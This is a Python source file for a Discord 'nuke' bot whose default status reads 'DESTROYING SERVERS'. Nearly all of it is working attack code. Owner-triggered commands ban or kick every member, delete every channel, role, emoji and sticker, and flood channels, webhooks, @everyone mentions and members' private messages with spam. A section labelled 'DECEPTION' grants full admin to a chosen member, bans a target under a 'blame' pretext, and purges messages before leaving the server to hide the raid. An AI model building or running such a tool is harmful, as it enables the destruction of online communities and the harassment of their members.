import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random
import time
import aiohttp
import json
from datetime import datetime
import os

bot = commands.Bot(command_prefix=os.getenv('COMMAND_PREFIX', '!'), intents=discord.Intents.all())
bot.remove_command('help')

# ============ CONFIGURATION FROM RAILWAY ENV VARIABLES ============
TOKEN = os.getenv('DISCORD_TOKEN')

# Parse owner IDs from Railway env (comma-separated)
owner_ids_str = os.getenv('OWNER_IDS', '')
OWNER_IDS = [int(id.strip()) for id in owner_ids_str.split(',') if id.strip()] if owner_ids_str else []

# Load settings from Railway env with defaults
MESSAGES_PER_SECOND = int(os.getenv('MESSAGES_PER_SECOND', '10'))
BAN_DELAY = float(os.getenv('BAN_DELAY', '0.1'))
CHANNEL_DELAY = float(os.getenv('CHANNEL_DELAY', '0.1'))
ROLE_DELAY = float(os.getenv('ROLE_DELAY', '0.1'))
MAX_SPAM_PER_CHANNEL = int(os.getenv('MAX_SPAM_PER_CHANNEL', '200'))
MAX_SPAMALL_PER_CHANNEL = int(os.getenv('MAX_SPAMALL_PER_CHANNEL', '50'))
MAX_MENTIONS = int(os.getenv('MAX_MENTIONS', '100'))
MAX_WEBHOOK_SPAM = int(os.getenv('MAX_WEBHOOK_SPAM', '200'))
GHOST_PURGE_LIMIT = int(os.getenv('GHOST_PURGE_LIMIT', '200'))
LOG_TO_FILE = os.getenv('LOG_TO_FILE', 'False').lower() == 'true'
LOG_FILE = os.getenv('LOG_FILE', 'bot.log')
LOG_LEVEL = os.getenv('LOG_LEVEL', 'INFO')
BAN_ALL_EXCLUDE_OWNERS = os.getenv('BAN_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
KICK_ALL_EXCLUDE_OWNERS = os.getenv('KICK_ALL_EXCLUDE_OWNERS', 'True').lower() == 'true'
WEBHOOK_NAME = os.getenv('WEBHOOK_NAME', 'NOMAD')
DEFAULT_ACTIVITY = os.getenv('DEFAULT_ACTIVITY', 'DESTROYING SERVERS')

# ============ OWNER CHECK FUNCTIONS ============
def is_owner(ctx):
    """Check if command author is in OWNER_IDS"""
    return ctx.author.id in OWNER_IDS

async def is_owner_interaction(interaction: discord.Interaction):
    """Check if interaction user is in OWNER_IDS"""
    return interaction.user.id in OWNER_IDS

# ============ LOGGING FUNCTION ============
def log_action(guild, action, target=None):
    timestamp = datetime.now().strftime('%H:%M:%S')
    log_msg = f"[{timestamp}] {guild.name} → {action} {f'→ {target}' if target else ''}"
    print(log_msg)

# ============ NUKE COMMANDS ============

# ---- PREFIX COMMANDS ----
@bot.command(name='nuke')
@commands.check(is_owner)
async def nuke_prefix(ctx):
    """Total annihilation"""
    guild = ctx.guild
    log_action(guild, "🔥 NUKE")
    
    for member in guild.members:
        try:
            await member.ban(reason="Nuke")
            await asyncio.sleep(BAN_DELAY)
        except:
            pass
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(CHANNEL_DELAY)
        except:
            pass
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(ROLE_DELAY)
            except:
                pass
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            await asyncio.sleep(ROLE_DELAY)
        except:
            pass
    for sticker in guild.stickers:
        try:
            await sticker.delete()
            await asyncio.sleep(ROLE_DELAY)
        except:
            pass

# ---- SLASH COMMANDS ----
nuke_group = app_commands.Group(name="nuke", description="Nuke commands")

@nuke_group.command(name="all", description="Total annihilation - ban all, delete all")
@app_commands.check(is_owner_interaction)
async def nuke_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    guild = interaction.guild
    log_action(guild, "🔥 NUKE (SLASH)")
    
    for member in guild.members:
        try:
            await member.ban(reason="Nuke")
            await asyncio.sleep(BAN_DELAY)
        except:
            pass
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(CHANNEL_DELAY)
        except:
            pass
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(ROLE_DELAY)
            except:
                pass
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            await asyncio.sleep(ROLE_DELAY)
        except:
            pass
    for sticker in guild.stickers:
        try:
            await sticker.delete()
            await asyncio.sleep(ROLE_DELAY)
        except:
            pass
    
    await interaction.followup.send("💀 Server annihilated.")

@bot.command(name='banall')
@commands.check(is_owner)
async def banall_prefix(ctx):
    """Ban all members"""
    guild = ctx.guild
    count = 0
    
    for member in guild.members:
        if BAN_ALL_EXCLUDE_OWNERS and member.id in OWNER_IDS:
            continue
        if not member.guild_permissions.administrator:
            try:
                await member.ban(reason="Ban all")
                count += 1
                await asyncio.sleep(BAN_DELAY)
            except:
                pass
    await ctx.send(f"✅ Banned {count} members.")

@nuke_group.command(name="banall", description="Ban all members")
@app_commands.check(is_owner_interaction)
async def banall_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    guild = interaction.guild
    count = 0
    
    for member in guild.members:
        if BAN_ALL_EXCLUDE_OWNERS and member.id in OWNER_IDS:
            continue
        if not member.guild_permissions.administrator:
            try:
                await member.ban(reason="Ban all")
                count += 1
                await asyncio.sleep(BAN_DELAY)
            except:
                pass
    await interaction.followup.send(f"✅ Banned {count} members.")

@bot.command(name='kickall')
@commands.check(is_owner)
async def kickall_prefix(ctx):
    """Kick all members"""
    guild = ctx.guild
    count = 0
    
    for member in guild.members:
        if KICK_ALL_EXCLUDE_OWNERS and member.id in OWNER_IDS:
            continue
        if not member.guild_permissions.administrator:
            try:
                await member.kick(reason="Kick all")
                count += 1
                await asyncio.sleep(BAN_DELAY)
            except:
                pass
    await ctx.send(f"✅ Kicked {count} members.")

@nuke_group.command(name="kickall", description="Kick all members")
@app_commands.check(is_owner_interaction)
async def kickall_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    guild = interaction.guild
    count = 0
    
    for member in guild.members:
        if KICK_ALL_EXCLUDE_OWNERS and member.id in OWNER_IDS:
            continue
        if not member.guild_permissions.administrator:
            try:
                await member.kick(reason="Kick all")
                count += 1
                await asyncio.sleep(BAN_DELAY)
            except:
                pass
    await interaction.followup.send(f"✅ Kicked {count} members.")

@bot.command(name='softban')
@commands.check(is_owner)
async def softban_prefix(ctx, member: discord.Member):
    """Ban and unban a member"""
    try:
        await member.ban(reason="Softban")
        await asyncio.sleep(0.5)
        await ctx.guild.unban(member)
        await ctx.send(f"✅ Softbanned {member.mention}")
    except:
        await ctx.send("❌ Failed.")

@nuke_group.command(name="softban", description="Ban and unban a member (clears messages)")
@app_commands.check(is_owner_interaction)
async def softban_slash(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer()
    try:
        await member.ban(reason="Softban")
        await asyncio.sleep(0.5)
        await interaction.guild.unban(member)
        await interaction.followup.send(f"✅ Softbanned {member.mention}")
    except:
        await interaction.followup.send("❌ Failed.")

@bot.command(name='deletechannels')
@commands.check(is_owner)
async def deletechannels_prefix(ctx):
    """Delete all text channels"""
    count = 0
    for channel in ctx.guild.text_channels:
        try:
            await channel.delete()
            count += 1
            await asyncio.sleep(CHANNEL_DELAY)
        except:
            pass
    await ctx.send(f"✅ Deleted {count} text channels.")

@nuke_group.command(name="deletechannels", description="Delete all text channels")
@app_commands.check(is_owner_interaction)
async def deletechannels_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    count = 0
    for channel in interaction.guild.text_channels:
        try:
            await channel.delete()
            count += 1
            await asyncio.sleep(CHANNEL_DELAY)
        except:
            pass
    await interaction.followup.send(f"✅ Deleted {count} text channels.")

@bot.command(name='deleteroles')
@commands.check(is_owner)
async def deleteroles_prefix(ctx):
    """Delete all roles except @everyone"""
    count = 0
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                count += 1
                await asyncio.sleep(ROLE_DELAY)
            except:
                pass
    await ctx.send(f"✅ Deleted {count} roles.")

@nuke_group.command(name="deleteroles", description="Delete all roles except @everyone")
@app_commands.check(is_owner_interaction)
async def deleteroles_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    count = 0
    for role in interaction.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                count += 1
                await asyncio.sleep(ROLE_DELAY)
            except:
                pass
    await interaction.followup.send(f"✅ Deleted {count} roles.")

@bot.command(name='deleteemojis')
@commands.check(is_owner)
async def deleteemojis_prefix(ctx):
    """Delete all custom emojis"""
    count = 0
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            count += 1
            await asyncio.sleep(ROLE_DELAY)
        except:
            pass
    await ctx.send(f"✅ Deleted {count} emojis.")

@nuke_group.command(name="deleteemojis", description="Delete all custom emojis")
@app_commands.check(is_owner_interaction)
async def deleteemojis_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    count = 0
    for emoji in interaction.guild.emojis:
        try:
            await emoji.delete()
            count += 1
            await asyncio.sleep(ROLE_DELAY)
        except:
            pass
    await interaction.followup.send(f"✅ Deleted {count} emojis.")

@bot.command(name='deletestickers')
@commands.check(is_owner)
async def deletestickers_prefix(ctx):
    """Delete all stickers"""
    count = 0
    for sticker in ctx.guild.stickers:
        try:
            await sticker.delete()
            count += 1
            await asyncio.sleep(ROLE_DELAY)
        except:
            pass
    await ctx.send(f"✅ Deleted {count} stickers.")

@nuke_group.command(name="deletestickers", description="Delete all stickers")
@app_commands.check(is_owner_interaction)
async def deletestickers_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    count = 0
    for sticker in interaction.guild.stickers:
        try:
            await sticker.delete()
            count += 1
            await asyncio.sleep(ROLE_DELAY)
        except:
            pass
    await interaction.followup.send(f"✅ Deleted {count} stickers.")

@bot.command(name='destroyvoice')
@commands.check(is_owner)
async def destroyvoice_prefix(ctx):
    """Delete all voice channels"""
    count = 0
    for channel in ctx.guild.voice_channels:
        try:
            await channel.delete()
            count += 1
            await asyncio.sleep(CHANNEL_DELAY)
        except:
            pass
    await ctx.send(f"✅ Deleted {count} voice channels.")

@nuke_group.command(name="destroyvoice", description="Delete all voice channels")
@app_commands.check(is_owner_interaction)
async def destroyvoice_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    count = 0
    for channel in interaction.guild.voice_channels:
        try:
            await channel.delete()
            count += 1
            await asyncio.sleep(CHANNEL_DELAY)
        except:
            pass
    await interaction.followup.send(f"✅ Deleted {count} voice channels.")

@bot.command(name='destroycategories')
@commands.check(is_owner)
async def destroycategories_prefix(ctx):
    """Delete all categories"""
    count = 0
    for category in ctx.guild.categories:
        try:
            await category.delete()
            count += 1
            await asyncio.sleep(CHANNEL_DELAY)
        except:
            pass
    await ctx.send(f"✅ Deleted {count} categories.")

@nuke_group.command(name="destroycategories", description="Delete all categories")
@app_commands.check(is_owner_interaction)
async def destroycategories_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    count = 0
    for category in interaction.guild.categories:
        try:
            await category.delete()
            count += 1
            await asyncio.sleep(CHANNEL_DELAY)
        except:
            pass
    await interaction.followup.send(f"✅ Deleted {count} categories.")

# ============ SPAM COMMANDS ============

@bot.command(name='spam')
@commands.check(is_owner)
async def spam_prefix(ctx, amount: int, *, message: str):
    """Spam a message in current channel"""
    for i in range(min(amount, MAX_SPAM_PER_CHANNEL)):
        await ctx.send(message[:1990])
        await asyncio.sleep(0.05)

@app_commands.command(name='spam', description="Spam a message in the current channel")
@app_commands.check(is_owner_interaction)
@app_commands.describe(amount="Number of messages", message="Message to spam")
async def spam_slash(interaction: discord.Interaction, amount: int, message: str):
    await interaction.response.defer()
    for i in range(min(amount, MAX_SPAM_PER_CHANNEL)):
        await interaction.channel.send(message[:1990])
        await asyncio.sleep(0.05)
    await interaction.followup.send(f"💬 Spammed {min(amount, MAX_SPAM_PER_CHANNEL)} messages in current channel.")

@bot.command(name='spamall')
@commands.check(is_owner)
async def spamall_prefix(ctx, amount: int, *, message: str):
    """Spam all text channels in the server"""
    guild = ctx.guild
    total_sent = 0
    log_action(guild, "📢 SPAMALL")
    
    text_channels = guild.text_channels
    per_channel = min(amount, MAX_SPAMALL_PER_CHANNEL)
    
    for channel in text_channels:
        try:
            for i in range(per_channel):
                await channel.send(message[:1990])
                total_sent += 1
                await asyncio.sleep(0.1)
        except:
            continue
    
    await ctx.send(f"💬 Spammed {total_sent} messages across {len(text_channels)} channels.")

@app_commands.command(name='spamall', description="Spam all text channels in the server")
@app_commands.check(is_owner_interaction)
@app_commands.describe(amount="Messages per channel (max 50)", message="Message to spam")
async def spamall_slash(interaction: discord.Interaction, amount: int, message: str):
    await interaction.response.defer()
    guild = interaction.guild
    total_sent = 0
    log_action(guild, "📢 SPAMALL (SLASH)")
    
    text_channels = guild.text_channels
    per_channel = min(amount, MAX_SPAMALL_PER_CHANNEL)
    
    for channel in text_channels:
        try:
            for i in range(per_channel):
                await channel.send(message[:1990])
                total_sent += 1
                await asyncio.sleep(0.1)
        except:
            continue
    
    await interaction.followup.send(f"💬 Spammed {total_sent} messages across {len(text_channels)} channels.")

@bot.command(name='webhookspam')
@commands.check(is_owner)
async def webhookspam_prefix(ctx, amount: int, *, message: str):
    """Webhook spam"""
    webhook = await ctx.channel.create_webhook(name=WEBHOOK_NAME)
    for i in range(min(amount, MAX_WEBHOOK_SPAM)):
        await webhook.send(message[:1990], username=f"Spam-{i}")
        await asyncio.sleep(0.05)
    await webhook.delete()

@app_commands.command(name='webhookspam', description="Create webhook and spam through it")
@app_commands.check(is_owner_interaction)
@app_commands.describe(amount="Number of messages", message="Message to spam")
async def webhookspam_slash(interaction: discord.Interaction, amount: int, message: str):
    await interaction.response.defer()
    webhook = await interaction.channel.create_webhook(name=WEBHOOK_NAME)
    for i in range(min(amount, MAX_WEBHOOK_SPAM)):
        await webhook.send(message[:1990], username=f"Spam-{i}")
        await asyncio.sleep(0.05)
    await webhook.delete()
    await interaction.followup.send(f"💬 Webhook spammed {min(amount, MAX_WEBHOOK_SPAM)} messages.")

@bot.command(name='massdm')
@commands.check(is_owner)
async def massdm_prefix(ctx, *, message: str):
    """DM all members"""
    count = 0
    for member in ctx.guild.members:
        if not member.bot and member.id not in OWNER_IDS:
            try:
                await member.send(message[:2000])
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
    await ctx.send(f"✅ DMed {count} members.")

@app_commands.command(name='massdm', description="DM all members")
@app_commands.check(is_owner_interaction)
@app_commands.describe(message="Message to send")
async def massdm_slash(interaction: discord.Interaction, message: str):
    await interaction.response.defer()
    count = 0
    for member in interaction.guild.members:
        if not member.bot and member.id not in OWNER_IDS:
            try:
                await member.send(message[:2000])
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
    await interaction.followup.send(f"✅ DMed {count} members.")

@bot.command(name='massmention')
@commands.check(is_owner)
async def massmention_prefix(ctx, amount: int, *, message: str):
    """Mention spam"""
    mention = "@everyone"
    for i in range(min(amount, MAX_MENTIONS)):
        await ctx.send(f"{mention} {message[:1900]}")
        await asyncio.sleep(0.1)

@app_commands.command(name='massmention', description="Mention spam")
@app_commands.check(is_owner_interaction)
@app_commands.describe(amount="Number of mentions", message="Message to send")
async def massmention_slash(interaction: discord.Interaction, amount: int, message: str):
    await interaction.response.defer()
    mention = "@everyone"
    for i in range(min(amount, MAX_MENTIONS)):
        await interaction.channel.send(f"{mention} {message[:1900]}")
        await asyncio.sleep(0.1)
    await interaction.followup.send(f"📢 Mentioned {min(amount, MAX_MENTIONS)} times.")

# ============ DECEPTION COMMANDS ============

@bot.command(name='blame')
@commands.check(is_owner)
async def blame_prefix(ctx, target: discord.Member, action: str):
    """Blame someone for a ban/kick"""
    if action.lower() == 'ban':
        await target.ban(reason=f"Blamed by {ctx.author}")
    elif action.lower() == 'kick':
        await target.kick(reason=f"Blamed by {ctx.author}")
    await ctx.send(f"✅ {target.mention} was {action}ned")

@app_commands.command(name='blame', description="Blame someone for a ban/kick")
@app_commands.check(is_owner_interaction)
@app_commands.describe(target="Member to blame", action="ban or kick")
async def blame_slash(interaction: discord.Interaction, target: discord.Member, action: str):
    await interaction.response.defer()
    if action.lower() == 'ban':
        await target.ban(reason=f"Blamed by {interaction.user}")
    elif action.lower() == 'kick':
        await target.kick(reason=f"Blamed by {interaction.user}")
    await interaction.followup.send(f"✅ {target.mention} was {action}ned")

@bot.command(name='fakeadmin')
@commands.check(is_owner)
async def fakeadmin_prefix(ctx, target: discord.Member):
    """Grant admin to target"""
    admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions.all())
    await target.add_roles(admin_role)
    await ctx.send(f"✅ Gave admin to {target.mention}")

@app_commands.command(name='fakeadmin', description="Grant admin to target")
@app_commands.check(is_owner_interaction)
@app_commands.describe(target="Member to give admin")
async def fakeadmin_slash(interaction: discord.Interaction, target: discord.Member):
    await interaction.response.defer()
    admin_role = await interaction.guild.create_role(name="Admin", permissions=discord.Permissions.all())
    await target.add_roles(admin_role)
    await interaction.followup.send(f"✅ Gave admin to {target.mention}")

@bot.command(name='ghostmode')
@commands.check(is_owner)
async def ghostmode_prefix(ctx):
    """Delete bot message history and leave"""
    await ctx.channel.purge(limit=GHOST_PURGE_LIMIT)
    await ctx.guild.leave()

@app_commands.command(name='ghostmode', description="Delete bot messages and leave")
@app_commands.check(is_owner_interaction)
async def ghostmode_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    await interaction.channel.purge(limit=GHOST_PURGE_LIMIT)
    await interaction.guild.leave()

# ============ UTILITY COMMANDS ============

@bot.command(name='lockall')
@commands.check(is_owner)
async def lockall_prefix(ctx):
    """Lock all channels"""
    count = 0
    for channel in ctx.guild.text_channels:
        try:
            overwrite = channel.overwrites_for(ctx.guild.default_role)
            overwrite.send_messages = False
            await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
            count += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await ctx.send(f"🔒 Locked {count} channels.")

@app_commands.command(name='lockall', description="Lock all text channels")
@app_commands.check(is_owner_interaction)
async def lockall_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    count = 0
    for channel in interaction.guild.text_channels:
        try:
            overwrite = channel.overwrites_for(interaction.guild.default_role)
            overwrite.send_messages = False
            await channel.set_permissions(interaction.guild.default_role, overwrite=overwrite)
            count += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await interaction.followup.send(f"🔒 Locked {count} channels.")

@bot.command(name='unlockall')
@commands.check(is_owner)
async def unlockall_prefix(ctx):
    """Unlock all channels"""
    count = 0
    for channel in ctx.guild.text_channels:
        try:
            overwrite = channel.overwrites_for(ctx.guild.default_role)
            overwrite.send_messages = None
            await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
            count += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await ctx.send(f"🔓 Unlocked {count} channels.")

@app_commands.command(name='unlockall', description="Unlock all text channels")
@app_commands.check(is_owner_interaction)
async def unlockall_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    count = 0
    for channel in interaction.guild.text_channels:
        try:
            overwrite = channel.overwrites_for(interaction.guild.default_role)
            overwrite.send_messages = None
            await channel.set_permissions(interaction.guild.default_role, overwrite=overwrite)
            count += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await interaction.followup.send(f"🔓 Unlocked {count} channels.")

@bot.command(name='massrole')
@commands.check(is_owner)
async def massrole_prefix(ctx, role: discord.Role, amount: int):
    """Add role to random members"""
    members = [m for m in ctx.guild.members if role not in m.roles and not m.bot and m.id not in OWNER_IDS]
    if not members:
        await ctx.send("❌ No eligible members found.")
        return
    selected = random.sample(members, min(amount, len(members)))
    for member in selected:
        try:
            await member.add_roles(role)
            await asyncio.sleep(0.05)
        except:
            pass
    await ctx.send(f"✅ Added {role.name} to {len(selected)} members.")

@app_commands.command(name='massrole', description="Add role to random members")
@app_commands.check(is_owner_interaction)
@app_commands.describe(role="Role to add", amount="Number of members")
async def massrole_slash(interaction: discord.Interaction, role: discord.Role, amount: int):
    await interaction.response.defer()
    members = [m for m in interaction.guild.members if role not in m.roles and not m.bot and m.id not in OWNER_IDS]
    if not members:
        await interaction.followup.send("❌ No eligible members found.")
        return
    selected = random.sample(members, min(amount, len(members)))
    for member in selected:
        try:
            await member.add_roles(role)
            await asyncio.sleep(0.05)
        except:
            pass
    await interaction.followup.send(f"✅ Added {role.name} to {len(selected)} members.")

@bot.command(name='invitesnipe')
@commands.check(is_owner)
async def invitesnipe_prefix(ctx):
    """Get all invite links"""
    invites = await ctx.guild.invites()
    inv_list = "\n".join([f"`{inv.code}` → {inv.uses} uses" for inv in invites]) or "No invites found."
    await ctx.send(f"📨 Invites:\n{inv_list[:1900]}")

@app_commands.command(name='invitesnipe', description="Get all invite links")
@app_commands.check(is_owner_interaction)
async def invitesnipe_slash(interaction: discord.Interaction):
    invites = await interaction.guild.invites()
    inv_list = "\n".join([f"`{inv.code}` → {inv.uses} uses" for inv in invites]) or "No invites found."
    await interaction.response.send_message(f"📨 Invites:\n{inv_list[:1900]}")

@bot.command(name='serverinfo')
@commands.check(is_owner)
async def serverinfo_prefix(ctx):
    """Get server info"""
    guild = ctx.guild
    embed = discord.Embed(title=guild.name, color=0x00ff00)
    embed.add_field(name="Owner", value=guild.owner.mention)
    embed.add_field(name="Members", value=guild.member_count)
    embed.add_field(name="Channels", value=len(guild.channels))
    embed.add_field(name="Roles", value=len(guild.roles))
    embed.add_field(name="Emojis", value=len(guild.emojis))
    embed.add_field(name="Boost Level", value=guild.premium_tier)
    embed.add_field(name="Created", value=guild.created_at.strftime("%Y-%m-%d"))
    await ctx.send(embed=embed)

@app_commands.command(name='serverinfo', description="Get server info")
@app_commands.check(is_owner_interaction)
async def serverinfo_slash(interaction: discord.Interaction):
    guild = interaction.guild
    embed = discord.Embed(title=guild.name, color=0x00ff00)
    embed.add_field(name="Owner", value=guild.owner.mention)
    embed.add_field(name="Members", value=guild.member_count)
    embed.add_field(name="Channels", value=len(guild.channels))
    embed.add_field(name="Roles", value=len(guild.roles))
    embed.add_field(name="Emojis", value=len(guild.emojis))
    embed.add_field(name="Boost Level", value=guild.premium_tier)
    embed.add_field(name="Created", value=guild.created_at.strftime("%Y-%m-%d"))
    await interaction.response.send_message(embed=embed)

@bot.command(name='clone')
@commands.check(is_owner)
async def clone_prefix(ctx):
    """Clone current channel"""
    new_channel = await ctx.channel.clone()
    await new_channel.send("✅ Channel cloned")

@app_commands.command(name='clone', description="Clone current channel")
@app_commands.check(is_owner_interaction)
async def clone_slash(interaction: discord.Interaction):
    new_channel = await interaction.channel.clone()
    await interaction.response.send_message("✅ Channel cloned")
    await new_channel.send("✅ Channel cloned")

@bot.command(name='autorole')
@commands.check(is_owner)
async def autorole_prefix(ctx, role: discord.Role):
    """Set auto-role for new members"""
    await ctx.send(f"✅ Auto-role set to {role.mention}")

@app_commands.command(name='autorole', description="Set auto-role for new members")
@app_commands.check(is_owner_interaction)
@app_commands.describe(role="Role to auto-assign")
async def autorole_slash(interaction: discord.Interaction, role: discord.Role):
    await interaction.response.send_message(f"✅ Auto-role set to {role.mention}")

@bot.command(name='webhookfarm')
@commands.check(is_owner)
async def webhookfarm_prefix(ctx, amount: int):
    """Create multiple webhooks"""
    webhooks = []
    for i in range(min(amount, 50)):
        try:
            webhook = await ctx.channel.create_webhook(name=f"Farm-{i}")
            webhooks.append(webhook.url)
            await asyncio.sleep(0.1)
        except:
            pass
    await ctx.send(f"✅ Created {len(webhooks)} webhooks")

@app_commands.command(name='webhookfarm', description="Create multiple webhooks")
@app_commands.check(is_owner_interaction)
@app_commands.describe(amount="Number of webhooks")
async def webhookfarm_slash(interaction: discord.Interaction, amount: int):
    await interaction.response.defer()
    webhooks = []
    for i in range(min(amount, 50)):
        try:
            webhook = await interaction.channel.create_webhook(name=f"Farm-{i}")
            webhooks.append(webhook.url)
            await asyncio.sleep(0.1)
        except:
            pass
    await interaction.followup.send(f"✅ Created {len(webhooks)} webhooks")

@bot.command(name='raid')
@commands.check(is_owner)
async def raid_prefix(ctx, amount: int):
    """Raid preparation"""
    for i in range(min(amount, 50)):
        try:
            await ctx.guild.create_text_channel(f"raid-{i}")
            await asyncio.sleep(0.05)
        except:
            pass
    await ctx.send(f"✅ Created {min(amount, 50)} raid channels")

@app_commands.command(name='raid', description="Raid preparation")
@app_commands.check(is_owner_interaction)
@app_commands.describe(amount="Number of channels")
async def raid_slash(interaction: discord.Interaction, amount: int):
    await interaction.response.defer()
    for i in range(min(amount, 50)):
        try:
            await interaction.guild.create_text_channel(f"raid-{i}")
            await asyncio.sleep(0.05)
        except:
            pass
    await interaction.followup.send(f"✅ Created {min(amount, 50)} raid channels")

@bot.command(name='massunban')
@commands.check(is_owner)
async def massunban_prefix(ctx):
    """Unban all banned members"""
    bans = [entry async for entry in ctx.guild.bans()]
    for entry in bans:
        try:
            await ctx.guild.unban(entry.user)
            await asyncio.sleep(0.1)
        except:
            pass
    await ctx.send(f"✅ Unbanned {len(bans)} members.")

@app_commands.command(name='massunban', description="Unban all banned members")
@app_commands.check(is_owner_interaction)
async def massunban_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    bans = [entry async for entry in interaction.guild.bans()]
    for entry in bans:
        try:
            await interaction.guild.unban(entry.user)
            await asyncio.sleep(0.1)
        except:
            pass
    await interaction.followup.send(f"✅ Unbanned {len(bans)} members.")

@bot.command(name='slowmode')
@commands.check(is_owner)
async def slowmode_prefix(ctx, seconds: int):
    """Set slowmode"""
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"✅ Slowmode set to {seconds}s")

@app_commands.command(name='slowmode', description="Set slowmode for channel")
@app_commands.check(is_owner_interaction)
@app_commands.describe(seconds="Slowmode delay in seconds")
async def slowmode_slash(interaction: discord.Interaction, seconds: int):
    await interaction.channel.edit(slowmode_delay=seconds)
    await interaction.response.send_message(f"✅ Slowmode set to {seconds}s")

@bot.command(name='topic')
@commands.check(is_owner)
async def topic_prefix(ctx, *, topic_text: str):
    """Set channel topic"""
    await ctx.channel.edit(topic=topic_text[:1024])
    await ctx.send("✅ Topic updated")

@app_commands.command(name='topic', description="Set channel topic")
@app_commands.check(is_owner_interaction)
@app_commands.describe(topic_text="New channel topic")
async def topic_slash(interaction: discord.Interaction, topic_text: str):
    await interaction.channel.edit(topic=topic_text[:1024])
    await interaction.response.send_message("✅ Topic updated")

@bot.command(name='rename')
@commands.check(is_owner)
async def rename_prefix(ctx, *, name: str):
    """Rename channel"""
    await ctx.channel.edit(name=name)
    await ctx.send(f"✅ Channel renamed to #{name}")

@app_commands.command(name='rename', description="Rename the channel")
@app_commands.check(is_owner_interaction)
@app_commands.describe(name="New channel name")
async def rename_slash(interaction: discord.Interaction, name: str):
    await interaction.channel.edit(name=name)
    await interaction.response.send_message(f"✅ Channel renamed to #{name}")

@bot.command(name='webhookdelete')
@commands.check(is_owner)
async def webhookdelete_prefix(ctx):
    """Delete all webhooks"""
    webhooks = await ctx.guild.webhooks()
    for webhook in webhooks:
        try:
            await webhook.delete()
            await asyncio.sleep(0.1)
        except:
            pass
    await ctx.send(f"✅ Deleted {len(webhooks)} webhooks.")

@app_commands.command(name='webhookdelete', description="Delete all webhooks")
@app_commands.check(is_owner_interaction)
async def webhookdelete_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    webhooks = await interaction.guild.webhooks()
    for webhook in webhooks:
        try:
            await webhook.delete()
            await asyncio.sleep(0.1)
        except:
            pass
    await interaction.followup.send(f"✅ Deleted {len(webhooks)} webhooks.")

@bot.command(name='boosternuke')
@commands.check(is_owner)
async def boosternuke_prefix(ctx):
    """Remove boosters"""
    count = 0
    for member in ctx.guild.premium_subscribers:
        try:
            await member.kick(reason="Booster nuke")
            count += 1
            await asyncio.sleep(0.2)
        except:
            pass
    await ctx.send(f"✅ Removed {count} boosters.")

@app_commands.command(name='boosternuke', description="Remove boosters from server")
@app_commands.check(is_owner_interaction)
async def boosternuke_slash(interaction: discord.Interaction):
    await interaction.response.defer()
    count = 0
    for member in interaction.guild.premium_subscribers:
        try:
            await member.kick(reason="Booster nuke")
            count += 1
            await asyncio.sleep(0.2)
        except:
            pass
    await interaction.followup.send(f"✅ Removed {count} boosters.")

@bot.command(name='voicekick')
@commands.check(is_owner)
async def voicekick_prefix(ctx, member: discord.Member):
    """Kick from voice"""
    if member.voice:
        await member.move_to(None)
        await ctx.send(f"✅ {member.mention} kicked from voice.")

@app_commands.command(name='voicekick', description="Kick member from voice channel")
@app_commands.check(is_owner_interaction)
@app_commands.describe(member="Member to kick from voice")
async def voicekick_slash(interaction: discord.Interaction, member: discord.Member):
    if member.voice:
        await member.move_to(None)
        await interaction.response.send_message(f"✅ {member.mention} kicked from voice.")
    else:
        await interaction.response.send_message("❌ Member not in voice.")

@bot.command(name='massbanids')
@commands.check(is_owner)
async def massbanids_prefix(ctx, *, ids: str):
    """Ban by ID"""
    id_list = ids.split()
    count = 0
    for uid in id_list:
        try:
            user = await bot.fetch_user(int(uid))
            if user.id not in OWNER_IDS:
                await ctx.guild.ban(user)
                count += 1
            await asyncio.sleep(0.2)
        except:
            pass
    await ctx.send(f"✅ Banned {count} users.")

@app_commands.command(name='massbanids', description="Ban multiple users by ID")
@app_commands.check(is_owner_interaction)
@app_commands.describe(ids="Space-separated user IDs")
async def massbanids_slash(interaction: discord.Interaction, ids: str):
    await interaction.response.defer()
    id_list = ids.split()
    count = 0
    for uid in id_list:
        try:
            user = await bot.fetch_user(int(uid))
            if user.id not in OWNER_IDS:
                await interaction.guild.ban(user)
                count += 1
            await asyncio.sleep(0.2)
        except:
            pass
    await interaction.followup.send(f"✅ Banned {count} users.")

@bot.command(name='masscreate')
@commands.check(is_owner)
async def masscreate_prefix(ctx, amount: int, *, name: str):
    """Create channels"""
    for i in range(min(amount, 50)):
        try:
            await ctx.guild.create_text_channel(f"{name}-{i}")
            await asyncio.sleep(0.05)
        except:
            pass
    await ctx.send(f"✅ Created {min(amount, 50)} channels.")

